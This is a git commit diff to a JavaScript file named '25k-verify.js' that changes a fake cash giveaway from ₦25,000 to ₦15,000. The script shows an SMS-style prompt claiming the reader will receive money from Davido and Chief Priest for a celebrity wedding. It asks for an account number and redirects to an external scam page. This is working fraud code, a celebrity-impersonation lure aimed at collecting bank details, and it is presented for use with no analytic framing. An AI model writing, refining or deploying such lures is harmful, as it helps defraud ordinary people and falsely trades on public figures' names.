98cc4bdfd97091c4142ba4ae546091645928c458
sweet16palz-hub <sweet16palz@gmail.com>
2026-07-31 08:29:09 +0100

    Update 25k-verify.js

--- 25k-verify.js
+++ 25k-verify.js
@@ -1,5 +1,5 @@
-var password = 'WITHDRAW ₦25,000'
-password=prompt('SMS: Congratulations, you are eligible to receive ₦25,000 From Davido and Chief Priest in celebration of Peller and Jarvis Wedding, click OK to Enter Your Acc. Number','WITHDRAW ₦25,000');
-if (password != 'WITHDRAW ₦25,000') {
+var password = 'WITHDRAW ₦15,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦15,000 From Davido and Chief Priest in celebration of Peller and Jarvis Wedding, click OK to Enter Your Acc. Number','WITHDRAW ₦15,000');
+if (password != 'WITHDRAW ₦15,000') {
 location.href='https://ebariba.com/25knaira.html';
 }
